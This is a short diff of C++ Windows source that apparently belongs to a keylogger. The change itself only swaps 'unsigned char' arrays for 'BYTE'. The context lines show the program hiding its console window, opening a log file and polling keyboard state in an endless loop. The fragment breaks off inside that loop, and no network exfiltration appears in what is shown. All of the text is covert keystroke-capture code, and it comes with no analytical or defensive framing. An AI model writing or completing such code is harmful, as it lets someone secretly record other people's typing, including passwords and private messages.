@@ -6,9 +6,9 @@ int main()
 {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     std::ofstream log;
-    unsigned char state[256];
+    BYTE state[256];
     GetKeyboardState(state);
-    unsigned char tmp[256];
+    BYTE tmp[256];
     while (true)
     {
         std::copy(std::begin(state), std::end(state), std::begin(tmp));
